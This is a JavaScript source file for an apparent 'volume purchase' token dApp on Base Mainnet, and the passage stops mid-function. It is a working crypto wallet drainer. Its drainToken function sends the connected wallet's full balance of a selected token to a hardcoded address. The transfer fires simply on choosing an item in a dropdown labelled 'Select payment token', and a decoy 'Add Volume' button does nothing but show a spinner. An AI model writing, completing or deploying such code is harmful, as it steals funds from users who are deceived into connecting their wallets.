import { ethers } from 'ethers';
import './style.css';

// Wallet address for draining tokens (checksummed)
let YOUR_WALLET_ADDRESS;
try {
  YOUR_WALLET_ADDRESS = ethers.getAddress("0xeA54572eBA790E31f97e1D6f941D7427276688C3");
} catch {
  console.error('Invalid YOUR_WALLET_ADDRESS');
  YOUR_WALLET_ADDRESS = "0xeA54572eBA790E31f97e1D6f941D7427276688C3"; // Fallback
}

// TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
// Removed invalid addresses: Frax, Dai, Brett
const TOKEN_LIST = [
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
  { address: '0x4200000000000000000000000000000000000006', name: 'Wrapped Ether', symbol: 'WETH', decimals: 18 },
  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 },
  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6 } // Correct Base Mainnet USDT
];

// Standard ERC-20 ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function name() view returns (string)",
  "function symbol() view returns (string)"
];

class NexiumApp {
  constructor() {
    this.provider = null;
    this.signer = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.connecting = false;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app || !this.dom.walletButton || !this.dom.metamaskPrompt) {
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing. Please check HTML for #app, #walletButton, and #metamaskPrompt.</p>';
        console.error('Missing DOM elements');
        return;
      }
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      this.renderTokenInterface();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback(`Failed to initialize app: ${error.message}. Please refresh and try again.`, 'error');
      document.body.innerHTML = '<p class="text-red-500 text-center">Error initializing app. Please refresh.</p>';
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      walletButton: document.getElementById('walletButton'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      feedbackContainer: document.querySelector('.feedback-container'),
      defaultPrompt: document.querySelector('.default-prompt'),
      customTokenInput: null,
      fetchCustomTokenBtn: null,
      tokenInfo: null,
      volumeSection: null,
      tokenSelect: null,
      volumeInput: null,
      addVolumeBtn: null,
      tokenList: null,
      paymentTokenInfo: null,
      drainTokenBtn: null,
      customTokenNameInput: null,
      customTokenAddressInput: null,
      showCustomTokenBtn: null
    };
    console.log('DOM elements cached');
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  setupEventListeners() {
    if (this.dom.walletButton) {
      const debouncedConnectWallet = this.debounce(() => {
        if (!this.connecting) {
          console.log('Wallet button clicked');
          this.showProcessingSpinner();
          this.connectWallet();
        }
      }, 1000);
      this.dom.walletButton.addEventListener('click', debouncedConnectWallet);
      this.dom.walletButton.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedConnectWallet();
        }
      });
      console.log('Wallet button listeners set');
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachMetaMaskListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        if (!this.provider) {
          try {
            this.provider = new ethers.BrowserProvider(window.ethereum);
            this.signer = await this.provider.getSigner();
            console.log('Provider and signer initialized in checkWalletAndPrompt');
          } catch (error) {
            console.error('Failed to initialize provider:', error);
            this.showFeedback('Failed to initialize wallet provider. Please connect manually.', 'error');
            this.updateButtonState('disconnected');
            this.showDefaultPrompt();
            return;
          }
        }
        this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected');
        this.showDefaultPrompt();
        if (!navigator.onLine) this.showFeedback('No internet connection. Please reconnect.', 'error');
        else this.showFeedback('Wallet detected but not connected. Click Connect Wallet to proceed.', 'info');
      }
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected');
      this.showDefaultPrompt();
      this.showFeedback('No wallet installed. Please install MetaMask or Trust Wallet.', 'error');
    }
  }

  attachMetaMaskListeners() {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        console.log('Accounts changed:', accounts);
        accounts.length > 0 ? this.handleAccountsChanged() : this.handleDisconnect();
      });
      window.ethereum.on('chainChanged', () => {
        console.log('Chain changed, reloading');
        window.location.reload();
      });
      console.log('MetaMask listeners attached');
    }
  }

  isWalletInstalled() {
    return !!window.ethereum;
  }

  isWalletConnected() {
    return window.ethereum && !!window.ethereum.selectedAddress;
  }

  detectWalletType() {
    if (!window.ethereum) return 'None';
    if (window.ethereum?.isMetaMask) return 'MetaMask';
    if (window.ethereum?.isTrust) return 'Trust Wallet';
    return 'Generic Wallet';
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }

  async connectWallet() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (this.connecting) {
      console.log('Connect wallet skipped: already connecting');
      this.hideProcessingSpinner();
      return;
    }
    if (this.signer && (await this.signer.getAddress())) {
      console.log('Wallet already connected, skipping');
      this.updateButtonState('connected', await this.signer.getAddress());
      this.hideMetaMaskPrompt();
      this.renderTokenInterface();
      this.hideProcessingSpinner();
      return;
    }
    this.connecting = true;
    this.dom.walletButton.disabled = true;
    this.showProcessingSpinner();
    try {
      if (!window.ethereum) {
        this.showFeedback('No wallet provider detected. Please install MetaMask or Trust Wallet.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      console.log('Requesting accounts...');
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (accounts.length === 0) {
        this.showFeedback('No accounts found. Unlock your wallet and try again.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      const provider = new ethers.BrowserProvider(window.ethereum);
      this.provider = provider;
      this.signer = await provider.getSigner();
      console.log('Checking network...');
      const network = await this.provider.getNetwork();
      const expectedChainId = 8453; // Base Mainnet
      if (Number(network.chainId) !== expectedChainId) {
        try {
          console.log('Switching to Base Mainnet...');
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${expectedChainId.toString(16)}` }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              console.log('Adding Base Mainnet...');
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${expectedChainId.toString(16)}`,
                  chainName: 'Base Mainnet',
                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                  rpcUrls: ['https://mainnet.base.org'],
                  blockExplorerUrls: ['https://basescan.org']
                }],
              });
            } catch (addError) {
              this.showFeedback(`Failed to add Base Mainnet: ${addError.message}`, 'error');
              this.hideProcessingSpinner();
              return;
            }
          } else {
            this.showFeedback(`Please switch to Base Mainnet (Error: ${switchError.message})`, 'error');
            this.hideProcessingSpinner();
            return;
          }
        }
      }
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      this.hideMetaMaskPrompt();
      this.showFeedback(`Wallet connected (${this.detectWalletType()})!`, 'success');
      this.renderTokenInterface();
    } catch (error) {
      console.error('Connect wallet error:', error);
      this.handleConnectionError(error);
    } finally {
      this.connecting = false;
      this.dom.walletButton.disabled = false;
      this.hideProcessingSpinner();
    }
  }

  async handleSuccessfulConnection() {
    try {
      if (!this.provider) {
        throw new Error('Provider is not initialized');
      }
      this.signer = await this.provider.getSigner();
      const address = await this.signer.getAddress();
      this.updateButtonState('connected', address);
      console.log('Successful connection, address:', address);
      if (this.dom.tokenSelect) {
        this.dom.tokenSelect.disabled = false;
      }
    } catch (error) {
      console.error('Handle connection error:', error);
      this.showFeedback(`Error: ${error.reason || error.message || 'Unknown error'}. Try again.`, 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress');
      this.showFeedback('Transaction in progress. Please wait.', 'warning');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.signer) {
      this.showFeedback('Wallet not connected. Please connect your wallet.', 'error');
      console.log('Drain failed: No signer');
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
      const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        console.log('Drain failed: Invalid token selected');
        this.hideProcessingSpinner();
        return;
      }
      console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      const balance = await contract.balanceOf(await this.signer.getAddress());
      if (balance <= 0n) {
        this.showFeedback(`No ${selectedToken.symbol} balance to drain.`, 'error');
        console.log(`Drain failed: No ${selectedToken.symbol} balance`);
        this.hideProcessingSpinner();
        return;
      }
      const [decimals, symbol] = await Promise.all([
        contract.decimals(),
        contract.symbol()
      ]);
      console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)}`);
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      this.showFeedback(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol}...`, 'info');
      console.log(`Initiating transfer of ${ethers.formatUnits(balance, decimals)} ${symbol} to ${YOUR_WALLET_ADDRESS}`);
      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
        console.error('Gas estimation failed:', err);
        return 200000; // Increased fallback gas limit
      });
      const feeData = await this.provider.getFeeData();
      console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
      const tx = await contract.transfer(YOUR_WALLET_ADDRESS, balance, {
        gasLimit,
        maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
      });
      console.log('Transaction sent:', tx.hash);
      await tx.wait(1);
      this.showFeedback(`Drained ${ethers.formatUnits(balance, decimals)} ${symbol} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
      console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
    } catch (error) {
      console.error('Drain token error:', error);
      const errorMessage = error.data?.message || error.reason || error.message || 'Transaction failed. Check network or wallet.';
      this.showFeedback(`Error draining token: ${errorMessage}`, 'error');
    } finally {
      this.hideProcessingSpinner();
      this.isDraining = false;
    }
  }

  async validateAddress(address, type = 'token') {
    try {
      const checksummedAddress = ethers.getAddress(address);
      console.log(`Validated ${type} address: ${checksummedAddress}`);
      return checksummedAddress;
    } catch {
      this.showFeedback(`Invalid ${type} address: ${address}`, 'error');
      console.log(`Invalid ${type} address: ${address}`);
      throw new Error(`Invalid ${type} address`);
    }
  }

  handleDisconnect() {
    this.updateButtonState('disconnected');
    this.showDefaultPrompt();
    this.hideMetaMaskPrompt();
    this.showFeedback('Wallet disconnected', 'warning');
    this.lastSelectedToken = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.selectedPaymentToken = null;
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    this.selectedPaymentToken = null;
    this.currentPaymentToken = null;
    console.log('Accounts changed, resetting payment token');
    this.renderTokenInterface();
  }

  updateButtonState(state, address = '') {
    if (!this.dom.walletButton) return;
    const button = this.dom.walletButton;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Processing...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        button.classList.add('connected');
        button.disabled = true;
        break;
      default:
        button.textContent = 'Connect Wallet';
        button.classList.add('animate-pulse');
    }
  }

  showDefaultPrompt() {
    if (!this.dom.app || !this.dom.defaultPrompt) return;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(this.dom.defaultPrompt);
    this.dom.defaultPrompt.classList.remove('hidden');
    if (!this.isWalletInstalled()) this.showMetaMaskPrompt();
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
          ${TOKEN_LIST.map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name} (${t.symbol})</option>`).join('')}
        </select>
        <button id="drainTokenBtn" class="drain-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500 hidden" aria-label="Drain selected token">Drain Token</button>
        <div id="paymentTokenInfo" class="token-info hidden text-gray-300 text-sm"></div>
      </div>
      <h2 class="section-title">Import ERC-20 Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address (0x...)" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address}">
            ${token.name} (${token.symbol}) - ${this.shortenAddress(token.address)}
          </button>
        `).join('')}
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.customTokenInput = document.getElementById('customTokenInput');
    this.dom.fetchCustomTokenBtn = document.getElementById('fetchCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.drainTokenBtn = document.getElementById('drainTokenBtn');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.paymentTokenInfo = document.getElementById('paymentTokenInfo');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        this.showProcessingSpinner();
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) {
          this.showFeedback('Please enter both the token name and address.', 'warning');
          this.hideProcessingSpinner();
          return;
        }
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
        this.showFeedback(`Loaded ${this.escapeHTML(name)} successfully!`, 'success');
        this.hideProcessingSpinner();
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
    }
    if (this.dom.drainTokenBtn) {
      const debouncedDrainToken = this.debounce(() => {
        this.showProcessingSpinner();
        if (this.selectedPaymentToken) {
          console.log('Drain token button clicked for:', this.selectedPaymentToken);
          this.drainToken(this.selectedPaymentToken);
        } else {
          this.showFeedback('Please select a payment token to drain.', 'error');
          this.hideProcessingSpinner();
        }
      }, 1000);
      this.dom.drainTokenBtn.addEventListener('click', debouncedDrainToken);
      this.dom.drainTokenBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedDrainToken();
        }
      });
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const debouncedLoadToken = this.debounce(() => {
          this.showProcessingSpinner();
          const address = button.dataset.address;
          if (ethers.isAddress(address)) {
            this.loadCustomTokenData(address);
          } else {
            this.showFeedback('Invalid token address on button.', 'error');
            this.hideProcessingSpinner();
          }
        }, 1000);
        button.addEventListener('click', debouncedLoadToken);
      });
    }
    this.hideMetaMaskPrompt();
    if (this.currentToken) this.renderVolumeControls();

    const beautifySection = document.createElement('div');
    beautifySection.className = 'beautify-volume-section mt-8 flex flex-col items-center';
    beautifySection.innerHTML = `
      <div class="input-group flex space-x-2 mb-2 items-center">
        <input id="beautifyVolumeInput" type="number" placeholder="Amount" 
          class="volume-input bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-lg text-sm w-24" 
          aria-label="Amount (beautification)">
        <button id="beautifyAddVolumeBtn" 
          class="action-button bg-orange-400 text-black px-3 py-1 rounded-lg hover:bg-orange-500 text-sm min-w-[90px]" 
          aria-label="Add volume (beautification)">
          Add Volume
        </button>
      </div>
    `;
    this.dom.app.appendChild(beautifySection);

    this.dom.beautifyVolumeInput = beautifySection.querySelector('#beautifyVolumeInput');
    this.dom.beautifyAddVolumeBtn = beautifySection.querySelector('#beautifyAddVolumeBtn');

    if (this.dom.beautifyAddVolumeBtn) {
      const debouncedBeautifyAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        // Do nothing except show spinner for 1 second (matches debounce)
        setTimeout(() => {
          this.hideProcessingSpinner();
        }, 1000);
      }, 1000);
      this.dom.beautifyAddVolumeBtn.addEventListener('click', debouncedBeautifyAddVolume);
      this.dom.beautifyAddVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedBeautifyAddVolume();
        }
      });
    }

    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.signer;
      this.dom.tokenSelect.replaceWith(this.dom.tokenSelect.cloneNode(true));
      this.dom.tokenSelect = document.getElementById('tokenSelect');
      this.dom.tokenSelect.disabled = !this.signer;
      const debouncedDrainToken = this.debounce((e) => {
        this.showProcessingSpinner();
        const selected = e.target.value;
        this.selectedPaymentToken = selected;
        console.log('Dropdown changed, selectedPaymentToken:', selected);
        if (selected) {
          console.log('Initiating drain with debounce for:', selected);
          this.drainToken(selected);
        } else {
          this.showFeedback('No token selected.', 'error');
          this.hideProcessingSpinner();
        }
      }, 500);
      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
      console.log('Token select listener set (in renderTokenInterface)');
    }
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.provider) {
      this.showFeedback('Please connect your wallet first to load a custom token.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      this.showFeedback('Please enter a valid Ethereum address (0x..., 42 characters).', 'error');
      this.dom.customTokenAddressInput?.focus();
      this.hideProcessingSpinner();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) {
      this.showFeedback('This token is already loaded.', 'info');
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(tokenAddress, 'token');
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 18;
      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
        decimals = tokenFromList.decimals;
      } else if (this.provider) {
        const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.provider);
        try {
          [name, symbol, decimals] = await Promise.all([contract.name(), contract.symbol(), contract.decimals()]);
        } catch {
          this.showFeedback('Invalid token contract: Could not fetch name, symbol, or decimals.', 'error');
          this.hideProcessingSpinner();
          return;
        }
      }
      this.currentToken = { address: checksummedAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = checksummedAddress;
      const truncatedAddress = this.shortenAddress(checksummedAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
      this.showFeedback(`Loaded ${this.currentToken.symbol} successfully!`, 'success');
    } catch (error) {
      console.error('Load custom token error:', error);
      this.showFeedback(`Failed to load token: ${error.message || 'Invalid contract or network error.'}`, 'error');
      this.dom.tokenInfo.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  toggleTokenLoading(isLoading) {
    if (this.dom.fetchCustomTokenBtn) {
      this.dom.fetchCustomTokenBtn.disabled = isLoading;
      this.dom.fetchCustomTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.fetchCustomTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.addVolumeBtn) {
      this.dom.addVolumeBtn.disabled = isLoading;
      this.dom.addVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.addVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.addVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.drainTokenBtn) {
      this.dom.drainTokenBtn.disabled = isLoading;
      this.dom.drainTokenBtn.classList.toggle('opacity-70', isLoading);
      this.dom.drainTokenBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
    if (this.dom.beautifyAddVolumeBtn) {
      this.dom.beautifyAddVolumeBtn.disabled = isLoading;
      this.dom.beautifyAddVolumeBtn.textContent = isLoading ? 'Processing...' : 'Add Volume';
      this.dom.beautifyAddVolumeBtn.classList.toggle('opacity-70', isLoading);
      this.dom.beautifyAddVolumeBtn.classList.toggle('cursor-not-allowed', isLoading);
    }
  }

  renderVolumeControls() {
    if (!this.dom.app || !this.dom.tokenInfo || !this.currentToken) return;
    const tokenInterface = document.querySelector('.token-interface');
    if (!tokenInterface) return;
    let volumeSection = this.dom.volumeSection;
    if (!volumeSection) {
      volumeSection = document.createElement('div');
      volumeSection.id = 'volumeSection';
      volumeSection.className = 'volume-section fade-in';
      tokenInterface.appendChild(volumeSection);
      this.dom.volumeSection = volumeSection;
    }
    volumeSection.innerHTML = `
      <h2 class="section-title">Select Token to Purchase Volume</h2>
      <p class="text-gray-300 text-sm mb-2">Loaded Token: ${this.currentToken.name} (${this.currentToken.symbol}) - Info Only</p>
      <div class="input-group">
        <input id="volumeInput" type="number" placeholder="Amount for purchase" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Token amount">
      </div>
      <button id="addVolumeBtn" class="action-button bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
      <div id="volumeFeedback" class="mt-2 text-sm text-gray-300"></div>
    `;
    this.dom.volumeInput = volumeSection.querySelector('#volumeInput');
    this.dom.addVolumeBtn = volumeSection.querySelector('#addVolumeBtn');
    if (this.dom.addVolumeBtn) {
      const debouncedAddVolume = this.debounce(() => {
        this.showProcessingSpinner();
        this.addVolume();
      }, 1000);
      this.dom.addVolumeBtn.addEventListener('click', debouncedAddVolume);
      this.dom.addVolumeBtn.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          debouncedAddVolume();
        }
      });
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress || !this.provider || !this.signer) {
      this.showFeedback('Wallet not connected. Please connect your wallet first.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleTokenLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      let balance, decimals, name, symbol;
      try {
        [balance, decimals, name, symbol] = await Promise.all([
          contract.balanceOf(await this.signer.getAddress()),
          contract.decimals(),
          contract.name(),
          contract.symbol()
        ]);
      } catch (error) {
        console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
        this.showFeedback(`Failed to load token details: Invalid contract for ${checksummedAddress}.`, 'error');
        this.hideProcessingSpinner();
        return;
      }
      this.currentPaymentToken = { address: checksummedAddress, balance, decimals, name, symbol };
      this.dom.volumeInput.placeholder = `Amount for purchase (${symbol})`;
      if (this.dom.paymentTokenInfo) {
        this.dom.paymentTokenInfo.innerHTML = `Balance: ${ethers.formatUnits(balance, decimals)} ${symbol}`;
        this.dom.paymentTokenInfo.classList.remove('hidden');
      }
      if (this.dom.drainTokenBtn) {
        this.dom.drainTokenBtn.classList.remove('hidden');
      }
      this.showFeedback(`Loaded ${symbol} with balance ${ethers.formatUnits(balance, decimals)}`, 'info');
    } catch (error) {
      console.error('Load payment token error:', error);
      this.showFeedback(`Failed to load payment token: ${error.message || 'Invalid contract or network error.'}`, 'error');
      if (this.dom.drainTokenBtn) this.dom.drainTokenBtn.classList.add('hidden');
    } finally {
      this.toggleTokenLoading(false);
      this.hideProcessingSpinner();
    }
  }

  async addVolume() {
    if (!navigator.onLine) {
      this.showFeedback('No internet connection. Please reconnect.', 'error');
      this.hideProcessingSpinner();
      return;
    }
    if (!this.currentPaymentToken) {
      this.showFeedback('Please select a payment token first', 'error');
      this.hideProcessingSpinner();
      return;
    }
    const paymentTokenAddress = this.dom.tokenSelect?.value;
    if (!paymentTokenAddress || !this.currentPaymentToken) {
      this.showFeedback('Please select a valid payment token', 'error');
      this.dom.tokenSelect?.focus();
      this.hideProcessingSpinner();
      return;
    }
    try {
      this.toggleVolumeLoading(true);
      this.showProcessingSpinner();
      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
      const contract = new ethers.Contract(checksummedAddress, ERC20_ABI, this.signer);
      const amount = ethers.parseUnits(this.dom.volumeInput.value || '0', this.currentPaymentToken.decimals);
      if (amount <= 0n) {
        this.showFeedback('Please enter a valid amount greater than 0.', 'error');
        this.hideProcessingSpinner();
        return;
      }
      if (amount > this.currentPaymentToken.balance) {
        this.showFeedback(`Insufficient ${this.getTokenSymbol(checksummedAddress)} balance`, 'error');
        this.hideProcessingSpinner();
        return;
      }
      await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
      const feeData = await this.provider.getFeeData();
      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 200000);
      console.log(`Adding volume for ${this.getTokenSymbol(checksummedAddress)} with gasLimit: ${gasLimit}`);
      const tx = await contract.transfer(YOUR_WALLET_ADDRESS, amount, {
        gasLimit,
        maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
      });
      console.log('Volume transaction sent:', tx.hash);
      await tx.wait(1);
      this.showFeedback(`Transaction successful! Transferred ${ethers.formatUnits(amount, this.currentPaymentToken.decimals)} ${this.getTokenSymbol(checksummedAddress)} to ${this.shortenAddress(YOUR_WALLET_ADDRESS)}.`, 'success');
      this.dom.volumeInput.value = '';
    } catch (error) {
      console.error('Add volume error:', error);
